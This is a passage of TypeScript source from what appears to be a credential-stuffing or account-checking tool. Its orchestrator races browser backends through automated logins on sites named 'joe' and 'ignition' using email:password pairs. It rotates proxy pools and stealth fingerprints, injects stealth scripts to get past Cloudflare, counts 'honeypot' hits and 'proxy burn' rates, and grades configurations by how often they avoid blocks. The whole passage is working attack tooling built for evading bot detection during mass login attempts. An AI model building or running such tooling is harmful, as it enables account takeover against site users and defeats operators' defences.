        this.log("WARN", `${modeName} AUTO-FIX: Concurrency decremented due to timeouts`);
      }
    }

    // After applying fixes: reset elimination state for a fresh retry pass
    // Only if at least one fix was applied
    if (fixes.length > 0) {
      this.log("INFO", `${modeName} AUTO-FIX: Resetting all backend eliminations for fresh retry pass with fixes applied`);
      for (const t of config.rotationTracking) {
        t.eliminated = false;
        t.fails = 0;
        t.blocks = 0;
        // Keep decisive + totalAttempts + totalDurationMs for cumulative reporting
      }
      fixes.push("All backend eliminations reset for fresh retry pass");
    } else {
      this.log("WARN", `${modeName} AUTO-FIX: No automatic fixes applicable — manual intervention required`);
      fixes.push("No automatic fixes applicable — manual intervention required");
    }

    // Emit fixes to dashboard
    this.emit("rotation-auto-fixes", { mode: modeName, fixes });
  }

  /**
   * Write a detailed experimental elimination results CSV.
   * Columns: Rank, Backend, ProxyPool, PoolName, Status, Eliminated, EliminationReason,
   *          TotalAttempts, Decisive, Blocks, Fails, SuccessRate, AvgDurationMs, Grade,
   *          OSProfile, uTLS, InputMode, CacheInjection,
   *          Err_CloudflareBlock, Err_ProxyConnect, Err_Timeout, Err_SelectorFailed, Err_Other
   *
   * Sorted by performance: surviving configs first (by decisive desc), then eliminated.
   */
  private writeExperimentalResultsCsv(configs: ExperimentalConfig[]): void {
    const POOL_NAMES: Record<string, string> = { "off": "Direct (No Proxy)", "none": "Direct (No Proxy)" };
    try {
      const configPath = path.join(process.cwd(), "proxy-config.json");
      const config = JSON.parse(fs.readFileSync(configPath, "utf-8"));
      for (const p of config.pools) {
        POOL_NAMES[p.id] = p.label;
      }
    } catch { /* intentional */ }

    // Compute derived stats
    const enriched = configs.map(c => {
      const total = c.totalAttempts || 1;
      const successRate = total > 0 ? (c.decisive / total * 100) : 0;
      const avgDur = total > 0 ? Math.round(c.totalDurationMs / total) : 0;

      let eliminationReason = "";
      if (c.eliminated) {
        if (c.blocks >= 2 && c.fails >= 2) eliminationReason = "Cloudflare blocks (2+) AND failures (2+)";
        else if (c.blocks >= 2) eliminationReason = `Cloudflare blocks reached threshold (${c.blocks}/2)`;
        else if (c.fails >= 2) eliminationReason = `Failures reached threshold (${c.fails}/2)`;
      }

      // Grade: A (>80% decisive), B (60-80%), C (40-60%), D (20-40%), F (<20%)
      let grade = "F";
      if (c.totalAttempts === 0) grade = "N/A";
      else if (successRate >= 80) grade = "A";
      else if (successRate >= 60) grade = "B";
      else if (successRate >= 40) grade = "C";
      else if (successRate >= 20) grade = "D";

      return { ...c, successRate, avgDur, eliminationReason, grade };
    });

    // Sort: surviving first (by decisive desc, then successRate), then eliminated (by decisive desc)
    enriched.sort((a, b) => {
      if (a.eliminated !== b.eliminated) return a.eliminated ? 1 : -1;
      if (b.decisive !== a.decisive) return b.decisive - a.decisive;
      return b.successRate - a.successRate;
    });

    const header = [
      "Rank", "Backend", "ProxyPool", "PoolName", "Status", "Eliminated",
      "EliminationReason", "TotalAttempts", "Decisive", "Blocks", "Fails",
      "SuccessRate%", "AvgDurationMs", "Grade",
      "FpStrategy", "InputMode", "CacheInjection",
      "Err_CloudflareBlock", "Err_ProxyConnect", "Err_Timeout", "Err_SelectorFailed", "Err_Other"
    ].join(",");

    const rows = enriched.map((c, i) => {
      const status = c.eliminated ? "ELIMINATED" : (c.totalAttempts === 0 ? "UNTESTED" : "SURVIVING");
      return [
        i + 1,
        c.backend,
        c.proxyPool,
        `"${POOL_NAMES[c.proxyPool] || "Unknown"}"`,
        status,
        c.eliminated ? "YES" : "NO",
        `"${c.eliminationReason}"`,
        c.totalAttempts,
        c.decisive,
        c.blocks,
        c.fails,
        c.successRate.toFixed(1),
        c.avgDur,
        c.grade,
        c.fpStrategy || "default",
        c.inputMode || "default",
        c.enableCacheInjection !== undefined ? c.enableCacheInjection : "default",
        c.errors["cloudflare block"] || 0,
        c.errors["proxy connect error"] || 0,
        c.errors["timeout"] || 0,
        c.errors["selector failed"] || 0,
        c.errors["other"] || 0,
      ].join(",");
    });

    const now = new Date();
    const ts = `${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, "0")}${String(now.getDate()).padStart(2, "0")}_${String(now.getHours()).padStart(2, "0")}${String(now.getMinutes()).padStart(2, "0")}${String(now.getSeconds()).padStart(2, "0")}`;
    const filename = `experimental_elimination_results_${ts}.csv`;
    const csvContent = [header, ...rows].join("\n") + "\n";

    fs.promises.writeFile(filename, csvContent, "utf-8").catch(() => { });
    this.log("INFO", `🧪 Experimental results written to ${filename} (${enriched.length} configs, ${enriched.filter(c => c.eliminated).length} eliminated, ${enriched.filter(c => !c.eliminated && c.totalAttempts > 0).length} surviving)`);
  }

  private log(level: string, message: string): void {
    const ts = new Date().toISOString();

    // Detailed CLI Log Format
    if (level === "ERR" || level === "ERROR") {
      engineLog.error(message);
    } else if (level === "WARN") {
      engineLog.warn(message);
    } else if (level === "DEBUG") {
      engineLog.debug(message);
    } else {
      engineLog.info(message);
    }

    // Broadcast for UI
    this.emit("log", {
      level,
      message,
      timestamp: ts,
    });
  }

  /**
   * Mid-batch backend hot-swapper.
   * Updates config and proxy pools seamlessly without dropping running tasks.
   */
  hotSwapBackend(newBackend: string): void {
    if (!this.config) return;
    const oldBackend = this.config.backend;
    this.config.backend = newBackend as any;

    engineLog.thought("Orchestrator", `Hot-swapping backend from ${oldBackend || 'default'} to ${newBackend}. Next dequeued credential will use this.`);
    this.log("INFO", `[HOT-SWAP] 🔄 Backend seamlessly updated from ${oldBackend || 'default'} to ${newBackend}. Next credential will use the new backend.`);

    // If concurrency changed based on backend limits
    const maxConcurrency = getMaxConcurrencyForBackend(newBackend);
    if (this.liveLimit) {
      const current = this.liveLimit.max;
      if (current > maxConcurrency) {
        this.log("INFO", `[HOT-SWAP] ⚙ Reducing concurrency from ${current} to ${maxConcurrency} for backend safety limit.`);
        this.liveLimit.setMax(maxConcurrency);
      }
    }
  }

  private sleep(ms: number, cancelToken?: { cancelled: boolean }): Promise<void> {
    return new Promise((resolve) => {
      if (this.config?.disableIdleHangingLogic && ms >= 10000) {
        this.log("WARN", `[HERMES TOGGLE] Bypassing ${ms}ms sleep due to disableIdleHangingLogic toggle`);
        resolve();
        return;
      }
      if (ms <= 100) {
        setTimeout(resolve, ms);
        return;
      }
      const end = Date.now() + ms;
      const interval = setInterval(() => {
        if (this.shouldStop || cancelToken?.cancelled || Date.now() >= end) {
          clearInterval(interval);
          resolve();
        }
      }, 50);
    });
  }

  /** Strip ANSI escape codes from strings */

  /** Parse a single CSV line respecting quoted fields (RFC 4180 compatible, accepts both formats) */
  private parseCsvLine(line: string): string[] {
    const fields: string[] = [];
    let current = "";
    let inQuotes = false;
    for (let i = 0; i < line.length; i++) {
      const ch = line[i];
      if (inQuotes) {
        if (ch === '"') {
          if (i + 1 < line.length && line[i + 1] === '"') {
            current += '"';
            i++; // skip escaped quote
          } else {
            inQuotes = false;
          }
        } else {
          current += ch;
        }
      } else {
        if (ch === '"') {
          inQuotes = true;
        } else if (ch === ",") {
          fields.push(current);
          current = "";
        } else {
          current += ch;
        }
      }
    }
    fields.push(current);
    return fields;
  }

  /** Resolve login controls through a typed, provenance-producing discovery strategy. */
  private async resolveSelectors(
    page: Page,
    site: SiteConfig,
  ): Promise<ResolvedLoginSelectors> {
    const variant = this.config?.loginDiscoveryVariant ?? "configured_css";
    const resolved = await resolveLoginStepSelectors(page, site.selectors, variant);
    this.log(
      "INFO",
      `  ${site.name}: selector discovery=${variant} sources=${resolved.provenance.usernameSource}/${resolved.provenance.passwordSource}/${resolved.provenance.submitSource}`,
    );
    return resolved;
  }

  public async runGoldenBenchmarkSuite(goldenCreds: any, baseConfig: EngineConfig, backendsToTest: string[]) {
    this.running = true;
    this.isPaused = false;
    this.config = baseConfig;
    this.emit("started", { time: Date.now(), isGoldenBenchmark: true });

    // Use the proper site configs (same selectors as normal runs)
    const allSites = JSON.parse(JSON.stringify(DEFAULT_TARGETS)) as SiteConfig[];

    // Build the list of sites to test based on which golden creds are set
    const sitesToTest: { site: SiteConfig; email: string; password: string }[] = [];

    if (goldenCreds.joe) {
      const joeSite = allSites.find(s => s.name === "joe");
      if (joeSite) {
        const [email, password] = goldenCreds.joe.split(":");
        sitesToTest.push({ site: joeSite, email, password });
      }
    }
    if (goldenCreds.ignition) {
      const ignSite = allSites.find(s => s.name === "ignition");
      if (ignSite) {
        const [email, password] = goldenCreds.ignition.split(":");
        sitesToTest.push({ site: ignSite, email, password });
      }
    }

    if (sitesToTest.length === 0) {
      this.log("ERR", "🏁 [Race] No golden credentials configured — aborting");
      this.running = false;
      this.emit("complete", { time: Date.now() });
      return;
    }

    const RACE_TIMEOUT_MS = 180_000; // 180s per-backend timeout

    // Shared race state
    const leaderboard: any[] = [];
    let winnerBackend: string | null = null;
    const raceStartTime = Date.now();

    this.log("INFO", `🏁 [Race] Starting concurrent benchmark race with ${backendsToTest.length} backends: ${backendsToTest.join(", ")}`);
    this.log("INFO", `🏁 [Race] Testing ${sitesToTest.length} site(s): ${sitesToTest.map(s => s.site.name).join(", ")}`);

    // Initialize leaderboard with all backends in "racing" state
    for (const backend of backendsToTest) {
      const entry: any = {
        backend,
        totalTime: 0,
        status: "Racing",
        winner: false,
        honeypotTriggerRate: 0,
        proxyBurnRate: 0,
        avgDomLatencyMs: 0,
        _failedSites: 0,
        _honeypots: 0,
        _burns: 0,
        _latencies: [] as number[],
      };
      // Add per-site status columns
      for (const { site } of sitesToTest) {
        entry[`${site.name}Time`] = 0;
        entry[`${site.name}Status`] = "⏳";
      }
      leaderboard.push(entry);
    }

    // Per-backend optimal settings — use the single source of truth constant
    const BACKEND_OPTIMAL_OVERRIDES = BACKEND_OPTIMAL_SETTINGS;

    this.emit("benchmark-update", { isComplete: false, leaderboard, raceStartTime });

    // ── Run ALL backends CONCURRENTLY per Rule 22 (strict-golden-benchmark-isolation) ──
    // Each backend races independently with its own timeout
    const benchmarkTasks = backendsToTest.map(async (backendName) => {
      const overrides = BACKEND_OPTIMAL_OVERRIDES[backendName] || {};
      const config: EngineConfig = { ...baseConfig, ...overrides, backend: backendName as any };
      const entry = leaderboard.find(e => e.backend === backendName)!;
      const backendStart = Date.now();
      let handle: SessionHandle | null = null;

      try {
        let raceTimer: NodeJS.Timeout;
        await Promise.race([
          (async () => {
            // ── Create session for this backend ──
            this.log("INFO", `🏃 [Race/${backendName}] Creating session...`);
            const benchBkSettings = resolveBackendSettings(backendName, config);

            let resolvedOsProfile: import("../profiles/profile-useragent.js").TargetOS = "mixed";
            if (config.emulateMobile) {
              resolvedOsProfile = "android";
            } else {
              resolvedOsProfile = "windows";
            }

            handle = await createSession({
              advanceRotation: true,
              slowMo: this.slowMoMs,
              fingerprintSeed: (() => {
                try {
                  const weightsPath = require('path').join(process.cwd(), 'hermes', 'stealth-weights.json');
                  if (require('fs').existsSync(weightsPath)) {
                    const weights = JSON.parse(require('fs').readFileSync(weightsPath, 'utf8'));
                    if (weights && weights.length > 0) {
                      const totalWeight = weights.reduce((sum: number, w: any) => sum + w.successRate, 0);
                      let random = Math.random() * totalWeight;
                      for (const w of weights) {
                        random -= w.successRate;
                        if (random <= 0) return w.seed;
                      }
                      return weights[0].seed;
                    }
                  }
                } catch { /* intentional */ }
                return Math.floor(Math.random() * 89999) + 10000;
              })(),
              backend: backendName as any,
              headless: (() => {
                if (backendName.endsWith("-headed")) return false;
                // Bare names and -headless all resolve to headless. Never return undefined.
                return true;
              })(),
              liveTest: backendName.endsWith("-headed") ? true : undefined,
              spiderApiKey: config.spiderApiKey,
              spiderLocalApiKey: config.spiderLocalApiKey,
              enableCacheInjection: benchBkSettings.enableCacheInjection,
              recordVideo: config.recordVideo ?? false,
              cleanSession: true,
              osProfile: resolvedOsProfile,
              proxyPool: config.proxyPool,
              mullvadSessionMode: config.mullvadSessionMode,
              requireProxy: config.requireProxy,
              useHttpCloak: benchBkSettings.useHttpCloak,
              stealthBypassHttpCloak: benchBkSettings.stealthBypassHttpCloak,
              injectStealthJS: benchBkSettings.injectStealthJS,
            });
            (handle as any)._nodeSpawnTime = Date.now();

            const sessionCreateTime = Date.now() - backendStart;
            this.log("INFO", `🏃 [Race/${backendName}] Session created in ${(sessionCreateTime / 1000).toFixed(1)}s (${handle.sessionId})`);

            const page = handle.page;
            (page as any).__sessionId = handle.sessionId;

            // ── Sequentially test each site with the same session ──
            for (const { site, email, password } of sitesToTest) {
              this.log("INFO", `🏃 [Race/${backendName}] Starting ${site.name} login...`);
              entry[`${site.name}Status`] = "🏃";
              this.emit("benchmark-update", { isComplete: false, leaderboard, raceStartTime, winner: winnerBackend });

              const siteStart = Date.now();

              const cred: Credential = {
                email,
                passwords: [password],
              };

              try {
                if (page.isClosed()) {
                  throw new Error(`Page closed before ${site.name} login could start`);
                }

                const result = await this.executeLoginFlow(
                  page,
                  site,
                  cred,
                  0,
                  0,
                  handle.proxyKey,
                  backendName,
                );

                entry[`${site.name}Time`] = Date.now() - siteStart;

                if (result.outcome !== "success") {
                  entry[`${site.name}Status`] = "❌";
                  entry.status = "Failed";
                  entry._failedSites++;

                  if (result.outcome === "honeypot") {
                    entry._honeypots++;
                  } else if (result.outcome === "blocked") {
                    entry._burns++;
                  }

                  entry.totalTime = Date.now() - backendStart;
                  this.log("WARN", `❌ [Race/${backendName}] ${site.name} login failed: ${result.outcome} (${entry[`${site.name}Time`]}ms)`);
                  this.emit("benchmark-update", { isComplete: false, leaderboard, raceStartTime, winner: winnerBackend });
                  throw new Error(`${site.name} failed: ${result.outcome}`);
                }

                entry[`${site.name}Status`] = "✅";
                this.log("INFO", `✅ [Race/${backendName}] ${site.name} login success in ${(entry[`${site.name}Time`] / 1000).toFixed(1)}s`);
                this.emit("benchmark-update", { isComplete: false, leaderboard, raceStartTime, winner: winnerBackend });

              } catch (siteErr: unknown) {
                entry[`${site.name}Time`] = Date.now() - siteStart;
                if (entry[`${site.name}Status`] !== "❌") entry[`${site.name}Status`] = "❌";
                throw siteErr;
              }
            }

            // All sites passed!
            entry.totalTime = Date.now() - backendStart;
            entry.status = "Success";
            this.log("INFO", `🏁 [Race/${backendName}] All sites complete! Total: ${(entry.totalTime / 1000).toFixed(1)}s`);
            this.emit("benchmark-update", { isComplete: false, leaderboard, raceStartTime, winner: winnerBackend });
          })(),
          new Promise<never>((_, reject) => {
            raceTimer = setTimeout(() => {
              if (entry.status === "Racing") {
                entry.status = "Timeout";
                entry.totalTime = RACE_TIMEOUT_MS;
                for (const { site } of sitesToTest) {
                  if (entry[`${site.name}Status`] === "🏃" || entry[`${site.name}Status`] === "⏳") {
                    entry[`${site.name}Status`] = "⏳";
                  }
                }
                this.log("WARN", `⏳ [Race/${backendName}] Timed out after ${RACE_TIMEOUT_MS / 1000}s`);
                this.emit("benchmark-update", { isComplete: false, leaderboard, raceStartTime, winner: winnerBackend });
              }
              reject(new Error(`${backendName}: ${RACE_TIMEOUT_MS / 1000}s Timeout`));
            }, RACE_TIMEOUT_MS);
            if (raceTimer && typeof raceTimer === 'object' && 'unref' in raceTimer) {
              (raceTimer as any).unref();
            }
          })
        ]).finally(() => { if (raceTimer) clearTimeout(raceTimer); });

      } catch (err: unknown) {
        if (!entry.status || entry.status === "Racing") {
          entry.status = (err instanceof Error ? err.message : String(err))?.includes("Timeout") ? "Timeout" : "Failed";
        }
        entry.totalTime = Date.now() - backendStart;
        this.log("WARN", `❌ [Race/${backendName}] Error: ${err instanceof Error ? err.message : String(err)}`);
        this.emit("benchmark-update", { isComplete: false, leaderboard, raceStartTime, winner: winnerBackend });
      } finally {
        // Always clean up the session immediately
        if (handle) {
          await (handle as SessionHandle).close().catch((e: any) => {
            this.log("WARN", `[Race/${backendName}] Session cleanup error: ${e instanceof Error ? e.message : String(e)}`);
          });
        }
      }
    });

    // Wait for ALL concurrent benchmark tasks to complete
    await Promise.allSettled(benchmarkTasks);

    // Determine the true winner (the FASTEST successful backend)
    let bestTime = Infinity;
    for (const entry of leaderboard) {
      if (entry.status === "Success" && entry.totalTime < bestTime) {
        bestTime = entry.totalTime;
        winnerBackend = entry.backend;
      }
    }

    if (winnerBackend) {
      const winEntry = leaderboard.find(e => e.backend === winnerBackend);
      if (winEntry) winEntry.winner = true;
      this.log("INFO", `🏆 [Race] WINNER: ${winnerBackend} with fastest time: ${(bestTime / 1000).toFixed(1)}s!`);
    }
    // Sort leaderboard: Winners first, then Success by fastest, then others
    leaderboard.sort((a, b) => {
      if (a.winner && !b.winner) return -1;
      if (!a.winner && b.winner) return 1;
      if (a.status === "Success" && b.status !== "Success") return -1;
      if (a.status !== "Success" && b.status === "Success") return 1;
      return a.totalTime - b.totalTime;
    });

    const raceElapsed = ((Date.now() - raceStartTime) / 1000).toFixed(1);
    this.log("INFO", `🏁 [Race] All backends finished in ${raceElapsed}s. Winner: ${winnerBackend || "NONE"}`);

    // Auto-promote the winner as the default backend
    if (winnerBackend) {
      this.log("INFO", `🏆 [Race] Auto-promoting ${winnerBackend} as the new default backend`);
    }

    this.running = false;

    // Finalize metrics calculation
    for (const entry of leaderboard) {
      entry.honeypotTriggerRate = sitesToTest.length > 0 ? (entry._honeypots / sitesToTest.length) : 0;
      entry.proxyBurnRate = sitesToTest.length > 0 ? (entry._burns / sitesToTest.length) : 0;
      entry.avgDomLatencyMs = entry._latencies.length > 0 ? (entry._latencies.reduce((a: number, b: number) => a + b, 0) / entry._latencies.length) : entry.totalTime;
    }

    const report: BenchmarkReport = {
      timestamp: new Date().toISOString(),
      durationMs: Date.now() - raceStartTime,
      winner: winnerBackend,
      metrics: leaderboard,
    };
    void AnalyticsAggregator.saveBenchmarkReport(report);

    this.emit("benchmark-complete", { isComplete: true, leaderboard, raceStartTime, winner: winnerBackend });
    this.emit("complete", { time: Date.now() });
  }
}